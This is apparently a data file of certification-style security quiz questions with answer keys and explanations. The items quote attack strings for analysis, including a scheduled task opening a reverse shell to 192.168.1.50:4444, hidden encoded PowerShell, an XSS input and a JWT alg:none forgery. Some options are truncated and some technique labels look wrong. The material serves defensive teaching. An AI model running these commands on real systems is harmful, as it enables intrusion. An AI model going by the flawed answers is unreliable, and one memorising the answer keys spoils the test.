    {q:"A third-party audit finds that the organization has excellent documentation and policies but the actual technical controls don't match the documented procedures. Which type of gap is this?",cat:"Reporting & Communication",opts:["A minor documentation issue","A network configuration error","A scanning tool failure","Policy-practice gap"],ans:3,why:"Policy-practice gaps are critical audit findings — they mean the organization has false confidence in controls that don't actually exist. Regulators and auditors consider this serious because documented-but-unimplemented controls don't provide actual protection.",ww:["Documentation issues are minor — the gap between policy and practice is a governance failure.","Network configuration is technical — this is a governance issue.","The scanning tool would show these gaps — not create them.",""],key:"Policy-practice gap = documented but not implemented. Critical audit finding. Governance failure, not just docs issue."}
  ],
  "security_ops_e5": [
    {q:"An analyst reviews the following Sysmon Event ID 3 (Network Connection): Process: C:\\Windows\\System32\\rundll32.exe, Destination: 198.51.100.5:443, InitiatedBySystem: false. The parent of rundll32 is explorer.exe and it was launched with: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication\". What attack technique is demonstrated?",cat:"Security Operations",opts:["A Windows system update","Normal Windows DLL execution","Standard HTML rendering","Squiblydoo/AppLocker bypass"],ans:3,why:"This is the 'Squiblydoo' LOLBin technique — using rundll32.exe to load mshtml.dll and execute JavaScript code, bypassing application whitelisting that blocks unsigned executables since rundll32 is signed by Microsoft.",ww:["System updates use trusted installers — not this execution pattern.","Normal DLL execution doesn't use javascript: protocol in the command line.","HTML rendering doesn't initiate network connections from rundll32.",""],key:"Squiblydoo: rundll32 + mshtml.dll + javascript: = AppLocker bypass. LOLBin abuse of signed Windows binary."},
    {q:"A threat hunter analyzes network flow data and notices workstation W1 is making DNS queries for 'aGVsbG8gd29ybGQ.c2.attacker.com' every 5 minutes. The subdomain changes each time but is always 24 characters. What is MOST likely occurring?",cat:"Security Operations",opts:["CDN traffic","Normal DNS lookups","Normal NTP queries","DNS exfiltration"],ans:3,why:"24-character Base64-encoded subdomains changing each query is a classic DNS tunneling pattern — data is encoded in subdomain labels and sent as DNS queries, which typically bypass firewall inspection focused on HTTP/HTTPS.",ww:["CDN domains are consistent and human-readable.","Normal DNS queries use human-readable domain names — not changing Base64 strings.","NTP uses UDP 123 to well-known time servers — not custom domains.",""],key:"Base64 subdomains + regular intervals + attacker domain = DNS tunneling exfiltration. Block at DNS level."},
    {q:"During purple team exercise, the red team attempts: powershell -w hidden -ep bypass -enc [base64]. The SIEM does NOT alert. EDR does NOT alert. Which detection gap does this reveal?",cat:"Security Operations",opts:["The attack wasn't real","The SIEM is working correctly","Missing PowerShell Script Block Logging (Event 4104)","The EDR needs to be replaced"],ans:2,why:"This failure reveals multiple detection gaps: no PowerShell Script Block Logging (Event 4104), no command-line argument alerts for known malicious flags (-ep bypass, -w hidden, -enc), and EDR behavioral rule gaps for encoded PS execution.",ww:["The attack is real and the detection gaps are genuine.","Detection failure is not correct behavior — it reveals gaps.","","EDR may need tuning — but the primary gap is missing Script Block Logging and SIEM rules."],key:"Purple team finds: missing Event 4104, no -ep bypass/-enc alerting. Document gaps and implement detection rules."},
    {q:"An analyst examines a suspicious file and finds: it's signed with a valid Microsoft certificate, spawns cmd.exe, connects to an unusual IP, and was seen on 3 endpoints after a targeted phishing campaign. VirusTotal shows 0/72 detections. What is the BEST assessment?",cat:"Security Operations",opts:["Report to Microsoft","Likely a signed malware or Signed Binary Proxy","Medium risk","Safe"],ans:1,why:"Valid certificates don't guarantee legitimacy — APTs steal certificates (e.g., Stuxnet used stolen Realtek/JMicron certificates) or abuse legitimate signed binaries. Behavioral indicators (cmd.exe spawn + unusual IP + phishing context + 3 endpoints) override certificate trust.",ww:["Microsoft notification may be appropriate but the immediate action is investigating the behavioral indicators.","","Behavioral + contextual evidence far outweighs certificate validity alone.","Certificate trust is not absolute — many APT tools use stolen or abused certificates."],key:"Certificate ≠ safe. Behavioral indicators + phishing context = investigate regardless of 0 AV detections."},
    {q:"A SOC analyst investigates an alert: 'Kerberoasting detected — SPN ticket request for MSSQL/DBSRV.corp.local from HR workstation'. The requesting account is a regular HR user. What is the attacker's LIKELY objective?",cat:"Security Operations",opts:["The user is testing SQL Server connectivity","The attacker has compromised the HR workstation","A network misconfiguration","Normal Kerberos authentication"],ans:1,why:"Kerberoasting requests Kerberos service tickets for SPNs, extracts the encrypted ticket (encrypted with the service account's password hash), and performs offline dictionary attacks. MSSQL service accounts often have weak passwords and high privileges.",ww:["Regular HR users don't need to request SPN tickets for SQL Server.","","This is an active attack — not misconfiguration.","Normal Kerberos authentication doesn't involve requesting SPN tickets from HR workstations."],key:"Kerberoasting: request SPN ticket → offline crack service account hash → gain database privileges. Detect with Event 4769."},
    {q:"An analyst reviewing Windows Security Event logs finds Event ID 4672 (Special Privileges Assigned) followed immediately by Event ID 4624 (Logon Type 9 - NewCredentials) for the same account. What technique does this sequence indicate?",cat:"Vulnerability Management",opts:["A configuration change","Normal user login","Pass-the-Hash or OverPass-the-Hash","Standard domain authentication"],ans:2,why:"Logon Type 9 (NewCredentials) creates a token with alternate credentials without interactive authentication — classic indicator of Pass-the-Hash or OverPass-the-Hash where an attacker uses a stolen NTLM hash to authenticate to remote resources.",ww:["Config changes don't create logon Type 9 events.","Normal logins use Type 2 (interactive) or Type 3 (network) — Type 9 is specific to new credentials injection.","","Standard domain auth uses Kerberos Type 3 — not Type 9 NewCredentials."],key:"Event 4624 Logon Type 9 = NewCredentials = Pass-the-Hash. Hash injected without plaintext password."},
    {q:"During threat hunting, you find that a process is reading from HKLM\\SECURITY\\Policy\\Secrets. This registry hive requires SYSTEM privileges to access. The reading process is not lsass.exe. What does this indicate?",cat:"Security Operations",opts:["Credential theft from LSA Secrets","Normal Windows operation","A Windows backup operation","Normal registry maintenance"],ans:0,why:"HKLM\\SECURITY\\Policy\\Secrets contains cached service passwords, domain credentials, and other secrets. Only SYSTEM and lsass.exe should access this hive — any other process doing so indicates credential harvesting.",ww:["","Only lsass.exe and SYSTEM processes access this hive legitimately.","Backup processes don't need to directly read LSA Secrets.","Normal maintenance doesn't involve this specific hive."],key:"HKLM\\SECURITY\\Policy\\Secrets access by non-lsass process = LSA Secret dumping. Service account creds at risk."},
    {q:"An analyst reviews Sysmon logs and finds: Event 8 (CreateRemoteThread) — SourceProcess: explorer.exe, TargetProcess: lsass.exe. What MITRE ATT&CK technique does this map to?",cat:"Security Operations",opts:["T1059 Command Execution","T1003.001 OS Credential Dumping: LSASS Memory","T1048 Exfiltration","T1566 Phishing"],ans:1,why:"CreateRemoteThread into lsass.exe is a classic credential dumping technique — injecting into the LSASS process to access and dump credentials from memory, similar to how Mimikatz operates. Sysmon Event 8 is key for detecting this.",ww:["Command execution (T1059) uses interpreter processes — not remote thread injection.","","Exfiltration involves data leaving the network — this is credential dumping.","Phishing is initial access — this is a post-access credential technique."],key:"Sysmon Event 8: RemoteThread into lsass.exe = T1003.001 LSASS credential dumping. Classic Mimikatz technique."},
    {q:"A blue team analyst reviews network traffic and finds HTTP requests with the following pattern: GET /api/update?data=exec(base64_decode('cGhwaW5mbygpOw=='))&token=abc123. The application is PHP-based. What is occurring and what is the IMMEDIATE action?",cat:"Security Operations",opts:["PHP code injection via deserialization","SQL injection","A misconfigured API","Normal API call"],ans:0,why:"base64_decode('cGhwaW5mbygpOw==') = phpinfo(); — this is a PHP code injection probe testing if user input is being eval()'d. If phpinfo() executes, the attacker can execute arbitrary PHP commands. This is active RCE testing requiring immediate response.",ww:["","SQL injection uses SQL syntax — this is PHP code injection.","This is active RCE probe — not misconfiguration.","Base64 in exec() context indicates code injection testing — not normal API usage."],key:"exec(base64_decode()) in URL = PHP RCE injection probe. phpinfo() = testing eval. Block + isolate + investigate NOW."},
    {q:"During incident response, memory forensics reveals process ID 4 (SYSTEM) has established an outbound connection to 203.0.113.50:443. PID 4 is the Windows System process and should never make outbound connections. What is the MOST sophisticated explanation?",cat:"Security Operations",opts:["Kernel-level rootkit or DKOM (Direct Kernel","A misconfigured firewall","A Windows update","Normal Windows networking"],ans:0,why:"PID 4 (System) never legitimately makes outbound connections. A connection attributed to PID 4 indicates either a kernel rootkit hiding its actual process by manipulating kernel objects, or a signed malicious kernel driver establishing stealthy connections.",ww:["","Firewall misconfiguration doesn't create false PID attributions.","Windows updates use svchost/trustedinstaller — not PID 4.","System process doesn't initiate outbound connections under any normal circumstances."],key:"PID 4 outbound connection = kernel rootkit or DKOM. Requires kernel-level forensics. Reimage is likely necessary."},
    {q:"An analyst notices a binary has the following properties: PE timestamp of 2024-01-15, creation time of 2024-01-15, but modified time of 2008-11-12. The file is found in C:\\Windows\\System32\\. VirusTotal shows 0/72 detections. What does this anomaly MOST indicate?",cat:"Security Operations",opts:["Normal Windows file aging","Timestomping","A backup restoration","The file is from Windows 2008"],ans:1,why:"PE compile timestamp (2024) and creation time (2024) contradicting modified time (2008) indicates timestomping — attackers manually change file timestamps to blend malicious files with old legitimate system files, but often forget to forge the PE header timestamp.",ww:["Normal files have consistent timestamps across all attributes.","","Backup restoration would produce consistent timestamps matching the backup date.","A genuine 2008 Windows file would have consistent timestamps across all sources."],key:"Timestomping: modified time backdated to evade detection. PE timestamp ≠ file modified time = anti-forensic evasion."},
    {q:"A purple team exercise tests whether the organization can detect DCSync — a technique where an attacker simulates a domain controller replication request to extract all password hashes from Active Directory. Which Windows Event ID is the PRIMARY indicator?",cat:"Security Operations",opts:["Event ID 4662","Event ID 4688 (Process Creation)","Event ID 7045 (Service Installed)","Event ID 4624 (Logon)"],ans:0,why:"DCSync (using Mimikatz lsadump::dcsync) triggers Event 4662 with specific GUID for DS-Replication-Get-Changes-All permission. Non-DC machine accounts performing replication is the detection signature — DCs legitimately replicate but workstations should not.",ww:["","Process creation shows the tool launch but Event 4662 shows the actual attack action.","Service installation is a persistence indicator — not DCSync.","Logon events don't capture directory replication requests."],key:"DCSync detection: Event 4662 + DS-Replication-Get-Changes-All + non-DC source account = credential harvest."},
    {q:"An analyst reviews Azure AD sign-in logs and finds successful MFA authentication from the US, but the OAuth refresh token was then used 45 minutes later from Eastern Europe to generate access tokens continuously for 6 hours without re-authentication. What attack is this?",cat:"Security Operations",opts:["A misconfigured token policy","Adversary-in-the-Middle (AiTM) token theft","Normal token behavior","Normal remote access"],ans:1,why:"AiTM phishing proxies sit between the victim and the legitimate service — after the victim completes MFA, the proxy forwards the request but steals the session/refresh token, which the attacker uses from their own location to maintain persistent access.",ww:["Token policies don't create geographic anomalies.","","Refresh token usage from a completely different geography 45 minutes later is not normal.","Remote access would show continuous consistent geography — not a 45-minute US→EU gap."],key:"AiTM token theft: MFA in US, refresh token stolen, used from EU 45 min later = stolen OAuth token. CAE/token binding prevents this."},
    {q:"A SOC analyst investigates suspicious activity and finds a scheduled task running: schtasks /create /tn WindowsDefenderUpdate /tr 'C:\\ProgramData\\Microsoft\\svchost.exe -h 192.168.1.50 -p 4444' /sc onlogon. The task name is 'WindowsDefenderUpdate'. What techniques are demonstrated?",cat:"Security Operations",opts:["A network configuration change","Multiple techniques","A legitimate update","Normal Windows Defender update task"],ans:1,why:"This combines three ATT&CK techniques: T1036 Masquerading (fake 'WindowsDefenderUpdate' name), T1053.005 Scheduled Task persistence (runs at logon), and T1059 reverse shell command (connecting to 192.168.1.50:4444). Multi-layer evasion.",ww:["Network config changes don't involve scheduled tasks with reverse shell parameters.","","Three distinct ATT&CK techniques are combined here.","Legitimate Windows Defender updates run from signed Microsoft paths — not ProgramData with IP flags."],key:"Scheduled task + fake MS name + reverse shell = T1036+T1053+T1059. Multi-layer evasion and persistence."}
  ],
  "vuln_mgmt_e5": [
    {q:"A penetration tester discovers a web application that reflects user input in JavaScript context: var data = '<user_input>'. The input 'test'; alert(1); // is submitted. What vulnerability exists and what is the SPECIFIC prevention?",cat:"Vulnerability Management",opts:["Reflected XSS only","SQL injection","DOM-based XSS in JavaScript context","CSRF"],ans:2,why:"Input reflected inside JavaScript requires JS-specific encoding — semicolons, quotes, and parentheses in JS context cannot be simply HTML-encoded (browsers unencode them before executing). JS encoding (\\x3C, \\x22, \\x27) or proper JS templating is required.",ww:["HTML entity encoding alone is insufficient in JS context — JS executes after HTML decoding.","SQL injection involves database context — this is JavaScript context XSS.","","CSRF doesn't involve reflected script execution."],key:"JS context XSS: HTML encoding insufficient — need JS-specific encoding (\\x3C) or avoid reflection in JS blocks entirely."},
    {q:"A security researcher finds that an application generates session tokens using: token = MD5(username + current_timestamp). Why is this critically flawed?",cat:"Vulnerability Management",opts:["Only weak for short usernames","MD5 is fine for non-sensitive data","The token is predictable","MD5 is slightly slow"],ans:2,why:"Session tokens must be cryptographically random and unpredictable. MD5(username+timestamp) is deterministic — an attacker knowing the username and time window can precompute all possible tokens for that window and find a valid one, bypassing authentication.",ww:["Predictability is critical regardless of username length.","Session tokens are security-sensitive by definition — predictable tokens are critically flawed.","","Token predictability is the critical flaw — not MD5 performance."],key:"Predictable session tokens = authentication bypass. Use CSPRNG (cryptographically secure random number generator) only."},
    {q:"A cloud security assessment finds an EC2 instance metadata service (IMDS) accessible without IMDSv2. An SSRF vulnerability is found in a web application running on the instance. What is the COMBINED attack impact?",cat:"Vulnerability Management",opts:["Critical","Medium","Low","Minimal"],ans:0,why:"SSRF can reach 169.254.169.254 (link-local metadata endpoint). IMDSv1 returns credentials without authentication. Combining SSRF with IMDSv1 allows stealing temporary IAM role credentials — potentially giving attacker full cloud account access depending on the role's permissions.",ww:["","The combination creates critical cloud account compromise potential.","IMDSv1 at /iam/security-credentials/ returns temporary access keys — highly sensitive.","IAM credentials in IMDS enable complete cloud API access — extremely sensitive."],key:"SSRF + IMDSv1 = steal EC2 IAM credentials via 169.254.169.254. Enforce IMDSv2 (requires session tokens)."},
    {q:"During a black-box penetration test, the tester discovers that the application uses JWT tokens and the header is: {\"alg\":\"HS256\",\"typ\":\"JWT\"}. When testing with alg: none, the server accepts the token without signature verification. What attack is this?",cat:"Vulnerability Management",opts:["CSRF","Buffer overflow","Algorithm confusion / JWT none algorithm attack","SQL injection"],ans:2,why:"The JWT 'none' algorithm vulnerability allows attackers to forge any payload (set role:admin, change user ID) by simply removing the signature and setting alg:none — bypassing all authentication if the server doesn't enforce algorithm requirements.",ww:["CSRF involves forged requests — not token algorithm manipulation.","Buffer overflow is memory — not JWT logic vulnerabilities.","","SQL injection targets database queries — not JWT processing."],key:"JWT alg:none = authentication bypass. Server must whitelist only specific algorithms. Never accept alg:none."},
    {q:"A developer implements rate limiting on login attempts: 5 failures per IP address per hour. A security researcher bypasses this by rotating through 1,000 IP addresses from a botnet. What additional control would BEST prevent this?",cat:"Vulnerability Management",opts:["Per-account rate limiting (not per-IP)","Longer passwords only","HTTPS enforcement","Stricter rate limiting per IP"],ans:0,why:"IP-based rate limiting is trivially bypassed with distributed attacks. Account-based lockout (per username regardless of IP), CAPTCHA, and checking submitted passwords against known-breached lists (Have I Been Pwned API) are more robust controls.",ww:["","Password length helps for brute force but not for credential stuffing with known passwords.","HTTPS doesn't prevent credential attacks.","Stricter per-IP limits are still bypassed by rotating IPs."],key:"Per-account lockout + CAPTCHA + breach password detection defeats distributed credential stuffing."},
    {q:"A vulnerability scanner reports: 'SSL/TLS Birthday Attack on AES-CBC in SSL/TLS (CVE-2016-2183)'. The affected port is 443 on a web server. The scanner recommends disabling 3DES. The system owner says 3DES is needed for compatibility with a legacy system. What is the CORRECT response?",cat:"Vulnerability Management",opts:["Implement compensating controls","Ignore the finding","Disable 3DES for all traffic","Accept the risk permanently"],ans:0,why:"The SWEET32 attack requires 3DES for exploitation but can be mitigated by limiting 3DES to only the specific legacy system needing it, while enforcing modern cipher suites for all other connections — balancing security and compatibility.",ww:["","Ignoring known vulnerabilities with available mitigations is negligent.","Disabling 3DES breaks the legacy system — business impact must be considered.","Permanent risk acceptance without compensating controls is inadequate."],key:"Legacy compatibility: limit 3DES to specific legacy path only + time-limited risk acceptance + upgrade roadmap."},
    {q:"A CVSS vector is: CVSS:3.1/AV:P/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H and the base score is 6.3. Despite High impact scores (C:H/I:H/A:H), why is the overall score only 6.3?",cat:"Vulnerability Management",opts:["Attack Vector Physical (AV:P)","The vulnerability is not real","The scope multiplier reduces the score","CVSS scoring is incorrect"],ans:0,why:"CVSS balances exploitability and impact. Physical access requirement (AV:P) dramatically reduces the exploitability component — most attackers cannot get physical access. High impact metrics on a physically-accessible-only device results in a moderate overall score.",ww:["","Physical access is genuinely hard to achieve, reducing real-world exploitability significantly.","Scope:Changed increases the score — it doesn't reduce it.","CVSS scoring correctly weights exploitability against impact."],key:"AV:P (physical) + PR:H = hard to exploit. High CIA impact moderated by very low exploitability = 6.3 overall."},
    {q:"A penetration tester sends: GET /api/v1/users/1 HTTP/1.1 and receives user1 data. They send GET /api/v1/users/2 and receive user2's private data including PII. They are authenticated as user1 only. What is the vulnerability and the root cause?",cat:"Vulnerability Management",opts:["XSS","SQL injection","CSRF","Broken Object Level Authorization (BOLA/IDOR)"],ans:3,why:"BOLA (Broken Object Level Authorization) — OWASP API Security Top 10 #1 — validates that a user is authenticated but not that they are authorized to access the specific requested object. Incrementing user IDs reveals all users' data.",ww:["XSS injects scripts — not object authorization.","SQL injection would require injecting SQL syntax — this is logical authorization.","CSRF forges requests — this is the server failing to check object ownership.",""],key:"BOLA = API checks auth but not object ownership. Fix: verify requesting user owns/has access to EVERY object ID."},
    {q:"An application uses this password reset flow: 1) User requests reset, 2) 6-digit code emailed, 3) Code valid for 10 minutes, 4) No rate limiting on code submission. A tester writes a script to try all 1,000,000 6-digit combinations. How long to crack the code assuming 100 requests/second?",cat:"Vulnerability Management",opts:["10,000 seconds (166 minutes)","Impossible to brute force","Not relevant since email codes are safe","1 minute"],ans:0,why:"At 100 req/sec, trying all 1M combinations takes 10,000 seconds (>10 min window). But without rate limiting and with parallel connections (10,000 req/sec), 1M codes take only 100 seconds — well within the 10-minute window. Rate limiting with exponential backoff is critical.",ww:["","Without rate limiting, brute force is very feasible with parallel connections.","Email codes without rate limiting are absolutely vulnerable to brute force.","Single-connection calculation misses the parallel attack vector."],key:"6-digit code without rate limiting = brute-forceable at scale. Rate limit + lockout + use TOTP or longer codes."},
    {q:"A security researcher discovers that an internal API endpoint used by the mobile app has no authentication at all: POST /internal/api/admin/users with Content-Type: application/json creates admin users. The endpoint is only accessible from the corporate network. Is this a vulnerability?",cat:"Vulnerability Management",opts:["Yes","No","No","Only if the network perimeter fails"],ans:0,why:"Network perimeter trust is not security — phishing can compromise internal machines, VPN provides internal access, and insider threats are already internal. Every API must authenticate requests. Internal APIs without auth are a critical vulnerability.",ww:["","Authentication is required for ALL APIs regardless of network location.","Network-level controls alone violate defense in depth principles.","Any internal compromise exposes this endpoint."],key:"No auth on internal API = critical. Any internal access (phishing/VPN) = unlimited admin account creation."},
    {q:"During source code review, a developer finds: conn.execute('UPDATE accounts SET balance = balance + ' + amount + ' WHERE id = ' + userId). Both amount and userId come from the mobile app request. What are ALL the vulnerabilities?",cat:"Vulnerability Management",opts:["Only SQL injection","Only input validation failure","Only the amount parameter is vulnerable","SQL injection via both parameters AND missing"],ans:3,why:"Both parameters are concatenated into SQL — direct injection. But even with parameterized queries, the business logic has no validation: negative amount = transfer money to attacker, amount exceeding balance = fraud, userId manipulation = modify other accounts. Both technical and logic flaws.",ww:["Both parameters are injectable — and there are business logic issues beyond SQL injection.","Input validation alone (without parameterization) doesn't fully prevent SQL injection.","userId is also concatenated directly — also injectable.",""],key:"SQL injection in both params + business logic (negative amounts, no balance check). Fix both: parameterize + validate."}
  ],
  "incident_response_e5": [
    {q:"An IR team responds to a breach. The attacker used a valid service account (svc-backup) to connect to multiple systems. The team identifies the account was compromised but isn't sure of the initial compromise vector. Which log combination would BEST identify how the service account was compromised?",cat:"Incident Response",opts:["Correlation of: Event 4648 (explicit credential use)","Only antivirus logs","Only firewall logs","Only the backup system logs"],ans:0,why:"Working backward: find the first svc-backup use (4648), find when its Kerberos TGT was first requested (4768), look at that machine for credential harvesting tools before that time. This timeline reconstruction reveals the compromise chain.",ww:["","AV logs may show if credential theft tools were detected but may miss fileless techniques.","Firewalls don't log credential theft events.","Backup system logs show what was accessed — not how credentials were stolen."],key:"Backward timeline: first svc-backup use → TGT request (4768) → credential harvest tool on that machine. Map the chain."},
    {q:"A forensic investigator recovers a malware sample. Static analysis shows it's a PE file with only 3 imports: LoadLibrary, GetProcAddress, and VirtualAlloc. What does this STRONGLY suggest?",cat:"Incident Response",opts:["A simple utility program","A compressed archive","A normal Windows application","A reflective DLL loader"],ans:3,why:"Minimal imports (just VirtualAlloc for memory allocation + LoadLibrary/GetProcAddress for dynamic API resolution) is the signature of a reflective loader — it allocates memory, loads libraries at runtime, and resolves all needed functions dynamically, defeating import-based static analysis.",ww:["A utility would have functional imports related to its purpose.","Archives are data formats — not PE executables with imports.","Normal applications have many imports for their functionality.",""],key:"PE with only VirtualAlloc + LoadLibrary + GetProcAddress = reflective loader. Hides all real capabilities from static analysis."},
    {q:"During a major breach investigation, the IR team discovers the attacker exfiltrated 500GB of data. The organization has DLP in place. Post-incident review shows DLP did not alert. Possible reasons include all EXCEPT:",cat:"Incident Response",opts:["DLP rules were tuned to allow 'business' file","Data was exfiltrated via encrypted channels DLP","DLP coverage gaps","All DLP logs are automatically forwarded to the"],ans:3,why:"SIEM log forwarding being real-time doesn't explain why DLP didn't alert — if DLP didn't detect the exfiltration, the log would show nothing to forward. The other options (encryption, rule gaps, coverage gaps) all explain why DLP failed to alert.",ww:["DLP rule tuning that allows sensitive file types is a configuration failure that explains missed detection.","Encrypted channels (HTTPS, custom protocols) can bypass DLP inspection.","USB/print coverage gaps explain why some exfiltration paths weren't monitored.",""],key:"DLP failure modes: encrypted channels + rule gaps + coverage gaps. SIEM forwarding doesn't cause DLP misses."},
    {q:"After containing a breach, the IR lead says 'we're ready for recovery.' The team has: isolated all compromised systems, removed all identified malware samples, and patched the exploited vulnerability. What critical step is MISSING before declaring eradication complete?",cat:"Incident Response",opts:["Verification that ALL persistence mechanisms","Recovery can proceed","The incident report is not filed","Management hasn't been notified"],ans:0,why:"Attackers typically install multiple persistence mechanisms — if the team only removed 'identified malware' without hunting for all persistence types, the attacker may have maintained access through undetected backdoors. Complete eradication requires exhaustive persistence hunting.",ww:["","Recovery before complete eradication risks re-infection.","Incident reports and notifications are separate from technical eradication requirements.","Management notification is separate from technical eradication completeness."],key:"Eradication = remove ALL persistence types. Hunt: accounts + scheduled tasks + run keys + WMI + COM + services."},
    {q:"Forensic analysis of a compromised system reveals a WMI subscription with: Consumer: ActiveScriptEventConsumer, Script: VBScript executing encoded commands, Filter: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'. What is this?",cat:"Incident Response",opts:["Normal system performance monitoring","WMI-based fileless persistence (T1546.003)","A backup monitoring script","Normal WMI monitoring"],ans:1,why:"WMI event subscriptions are a sophisticated fileless persistence technique — the subscription is stored in the WMI repository (not the file system), executes VBScript on triggered events, and survives reboots. Commonly used by APTs for long-term persistence.",ww:["Legitimate performance monitoring uses documented standard scripts — not encoded VBScript consumers.","","This is an attack technique — not legitimate backup monitoring.","Normal WMI monitoring uses standard Win32 classes — not ActiveScriptEventConsumer with encoded commands."],key:"WMI persistence: ActiveScriptEventConsumer + encoded script + event filter = fileless, reboot-persistent backdoor."},
    {q:"A malware analyst reverses a sample and finds it uses the following technique: it reads its own process memory, XOR-decrypts a blob with a key derived from machine-specific values (volume serial number + username), then loads the decrypted DLL reflectively. What detection challenge does this create?",cat:"Incident Response",opts:["Easy to detect with antivirus","Standard encryption is easy to analyze","Environment-keyed malware","None"],ans:2,why:"Environment-keyed malware is a sandbox evasion technique — by tying the decryption key to unique machine identifiers (volume serial, username, MAC), the payload cannot be decrypted in a sandbox. Only memory forensics on the actual compromised machine or key reverse-engineering reveals the true payload.",ww:["Traditional AV signatures cannot detect encrypted payloads that only decrypt with the target machine's values.","This is advanced evasion — not standard encryption.","","Environment-keyed malware is specifically designed to defeat sandbox analysis."],key:"Environment-keyed malware = sandbox evasion. Key from machine values = only decrypts on target. Memory forensics required."},
    {q:"During incident response, the team discovers the attacker maintained access for 14 months without detection. Timeline reconstruction shows: Month 1 - initial phishing, Month 2 - domain admin obtained via Kerberoasting, Months 3-14 - silent data exfiltration of 2TB via HTTPS POST to a cloud storage service. No alerts were generated during months 3-14. What is the ROOT CAUSE of the 14-month dwell time?",cat:"Incident Response",opts:["The firewall failed","Only the SIEM was misconfigured","The attack was too sophisticated to detect","Multiple overlapping detection failures"],ans:3,why:"14 months of silent exfiltration via HTTPS indicates: no behavioral baselines (HTTPS volume anomaly), no DLP (bulk upload to personal cloud), no UEBA (abnormal data access), and no active threat hunting. Multiple independent detection gaps allowed prolonged dwell. Not a single failure — a detection program failure.",ww:["Firewall alone doesn't explain 14 months undetected — multiple detection layers failed.","Multiple independent controls failed — not just SIEM.","Sophisticated attacks are detectable — 2TB HTTPS POST over 12 months creates anomalies that should trigger behavioral detection.",""],key:"14-month dwell = multiple detection gaps. No behavioral baselines + no DLP + no UEBA + no hunt program = failure."},
    {q:"A forensic investigator finds a service installed as: ImagePath: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand [base64] 2>&1 > NULL. The service is named 'WindowsTimeService'. The real Windows Time service is W32Time. What is this?",cat:"Incident Response",opts:["The Windows Time Service","A backup service","A monitoring agent","Service-based persistence using masquerading"],ans:3,why:"This combines T1036 (masquerading as W32Time), T1543.003 (service persistence), T1059.001 (encoded PowerShell), and output redirection to NULL to hide evidence. The legitimate W32Time service uses a different binary path — this is a fake service with malicious payload.",ww:["The real W32Time service uses %SystemRoot%\\system32\\svchost.exe -k LocalService — not cmd.exe + PowerShell.","Backup services use proper backup application binaries.","Monitoring agents use vendor-specific signed binaries.",""],key:"Fake service + masquerading + hidden encoded PS + NULL output = sophisticated multi-technique APT persistence."}
  ],
  "reporting_comms_e5": [
    {q:"An organization is breached. GDPR applies (EU customer data affected). The DPO discovers the breach on a Tuesday at 4 PM. What is the EXACT regulatory deadline and what must the notification to the supervisory authority include?",cat:"Reporting & Communication",opts:["72 hours from discovery (Friday 4 PM deadline)","30 days","24 hours","Only if more than 1,000 people affected"],ans:0,why:"GDPR Article 33 requires notification to the supervisory authority within 72 hours of becoming aware of the breach. The notification must include specified elements but can be submitted in phases if full information is not yet available — initial notification within 72 hours, supplemented later.",ww:["","GDPR mandates 72 hours — not 30 days.","24 hours is not the GDPR requirement.","GDPR has no minimum threshold for supervisory authority notification."],key:"GDPR breach notification: 72 hours to DPA. Include nature + affected persons + DPO contact + consequences + measures."},
    {q:"A CISO presents to the board after a breach: 'We had 99.7% uptime last year, responded to 15,000 alerts, and only had one major incident.' The board asks: 'Does that mean we are secure?' What is the MOST HONEST and COMPLETE response?",cat:"Reporting & Communication",opts:["The metrics prove excellent security","These metrics measure activity, not security","Yes","We need more budget"],ans:1,why:"Activity metrics (uptime, alert count) don't measure security effectiveness. The board needs: how quickly were threats detected? How much data was lost in the one incident? What percentage of the environment is monitored? Are vulnerabilities being fixed faster?",ww:["Activity ≠ effectiveness — honest security reporting includes outcome metrics.","","One incident could be catastrophic — volume doesn't measure impact or prevention effectiveness.","Budget discussions are secondary to honest program assessment."],key:"Activity metrics ≠ security outcomes. Add MTTD/MTTR, recurring vuln rate, coverage %, and incident impact."},
    {q:"Post-breach, the legal team asks the IR team to stop documenting their findings in the incident report and communicate only verbally going forward. What is the APPROPRIATE response from the IR lead?",cat:"Reporting & Communication",opts:["Comply immediately","Discuss with legal","Delete all existing documentation","Ignore legal and continue as normal"],ans:1,why:"Legal may be trying to protect documentation under attorney-client privilege (legitimate concern) or prevent regulatory evidence (problematic). The IR team should discuss with legal to find an approach that protects legal interests while maintaining IR effectiveness and meeting regulatory documentation requirements.",ww:["Blindly complying may violate regulatory requirements for incident documentation.","","Deleting documentation may constitute evidence destruction.","Ignoring legal creates legal and professional liability for the IR team."],key:"Legal hold vs. IR documentation: discuss with legal about privilege protection rather than ceasing documentation entirely."},
    {q:"A vulnerability report shows 500 Critical findings. The CISO uses SLA data to present to the CIO: 'We closed 480 criticals within 24 hours.' The CIO is impressed. An analyst later reveals that 450 of those 480 closures were marked 'Risk Accepted' without compensating controls. What is the ACTUAL program performance?",cat:"Reporting & Communication",opts:["Excellent","Unclear without more data","Acceptable","Poor"],ans:3,why:"SLO gaming — closing findings as 'risk accepted' to meet SLA metrics without actual compensating controls or formal risk owner approval is metric manipulation. It shows excellent SLO compliance on paper while the actual risk remains unaddressed.",ww:["480 closed in 24 hours is meaningless if 450 are improperly risk-accepted.","The data reveals a governance failure — it is not unclear.","Risk acceptance requires formal approval, compensating controls, and time limits — not bulk closure.",""],key:"Metric gaming: risk accepting vulns to meet SLOs without actual risk reduction = governance failure. Audit closures."},
    {q:"An organization must notify under HIPAA (60 days), GDPR (72 hours), a US state law (30 days), and PCI DSS (immediately + quarterly external scan requirement). The breach was discovered Monday at 9 AM. In what ORDER must notifications happen and who receives each?",cat:"Reporting & Communication",opts:["1) GDPR: DPA notification by Thursday 9 AM (72h)","All at the same time","Only the most strict regulation applies","Only notify customers"],ans:0,why:"Multiple regulations apply simultaneously with different timelines and different recipients. GDPR is most urgent (72h to DPA). PCI DSS requires immediate notification to card brands. State laws have their own AG notification timeline. HIPAA has 60-day OCR notification. Each requires different information.",ww:["","Each regulation has different deadlines — simultaneous notification misses priority sequencing.","All applicable regulations must be met — the strictest doesn't override others.","Customer notification is required but regulatory notification comes first."],key:"Multiple regulations = multiple timelines. GDPR 72h → PCI immediate → State 30d → HIPAA 60d. Different info to each."},
